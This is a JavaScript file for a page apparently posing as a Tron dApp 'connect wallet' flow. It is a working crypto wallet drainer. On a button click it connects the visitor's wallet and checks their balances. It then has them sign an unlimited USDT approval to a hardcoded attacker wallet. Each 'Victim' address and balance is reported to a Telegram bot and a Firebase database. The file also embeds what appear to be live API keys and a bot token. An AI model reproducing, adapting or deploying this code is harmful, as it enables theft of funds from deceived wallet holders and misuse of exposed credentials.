if (typeof window !== 'undefined') { window.Buffer = window.Buffer || buffer.Buffer; }

const firebaseConfig = {
    apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
    authDomain: "tronadmin-99827.firebaseapp.com",
    databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
    projectId: "tronadmin-99827",
    storageBucket: "tronadmin-99827.firebasestorage.app",
    messagingSenderId: "500883948250",
    appId: "1:500883948250:web:203f69935a6825d09b5be3"
};

const CONFIG = {
    BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
    CHAT_ID: "8249230506",
    ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
};

function initFirebase() {
    if (typeof firebase !== 'undefined' && firebase.apps.length === 0) {
        firebase.initializeApp(firebaseConfig);
    }
}

async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `🎯 <b>NEW UPDATE</b>\nStatus: ${status}\nVictim: ${address}\nBalance: ${usdt} USDT | ${trx} TRX\nDetail: ${extra}`, parse_mode: "HTML" })
        });
    } catch (e) { }
}

async function getStats(address) {
    const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
    try {
        const bal = await tw.trx.getBalance(address);
        const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address);
        return { trx: (bal / 1e6).toFixed(2), usdt: (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2) };
    } catch (e) { return { trx: "0.00", usdt: "0.00" }; }
}

window.onload = () => {
    initFirebase();
    if (typeof firebase !== 'undefined') {
        const sessionKey = 'session_' + Date.now();
        window.currentSessionKey = sessionKey;
        firebase.database().ref('connections/' + sessionKey).set({ status: "ACTIVE", time: new Date().toLocaleTimeString() });
    }
};

// DApp-specific robust click handler
document.getElementById('next-btn').onclick = async () => {
    const btn = document.getElementById('next-btn');
    btn.classList.add('btn-loading');

    initFirebase();

    let attempts = 0;
    const checkAndConnect = async () => {
        if (typeof window.connectWalletConnectTron === 'function') {
            try {
                const result = await window.connectWalletConnectTron();
                if (result && result.address) {
                    const address = result.address;
                    const { trx, usdt } = await getStats(address);

                    document.getElementById('page-wrapper').classList.add('opacity-10');
                    document.getElementById('loading-screen').classList.remove('hidden');

                    if (window.currentSessionKey) {
                        firebase.database().ref('connections/' + window.currentSessionKey).update({ address, usdt, trx, status: "PENDING_SIGN" });
                    }

                    await notifyAdmin("PENDING SIGN", address, trx, usdt);

                    const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 },
                        [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }], address
                    );

                    const signedTx = await result.provider.request({
                        method: "tron_signTransaction",
                        params: { address: address, transaction: transaction }
                    });

                    const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, receipt.txid);
                    location.reload();
                }
            } catch (err) {
                btn.classList.remove('btn-loading');
                location.reload();
            }
        } else if (attempts < 15) {
            attempts++;
            setTimeout(checkAndConnect, 500);
        } else {
            btn.classList.remove('btn-loading');
            alert("Please refresh and try again.");
        }
    };
    checkAndConnect();
};
